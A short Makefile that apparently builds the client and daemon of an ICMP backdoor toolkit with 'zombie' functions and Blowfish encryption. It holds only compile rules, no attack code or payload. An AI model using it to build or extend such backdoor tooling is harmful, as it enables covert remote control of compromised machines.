CC=gcc
RM=rm
FILES=files
CFLAGS=-O2 -Wall -s -I $(FILES)/include -I $(FILES)/blowfish -I include -c

client: 
	$(CC) $(CFLAGS) -D_CLIENT_ s_icmp_pkt.c
	$(CC) $(CFLAGS) -D_CLIENT_ icmp_backdoor_connect.c
	$(CC) $(CFLAGS) -D_CLIENT_ zombie_funcs.c
server:
	$(CC) $(CFLAGS) -D_SERVER_ s_icmp_pkt.c
	$(CC) $(CFLAGS) -D_SERVER_ icmp_backdoord.c

	
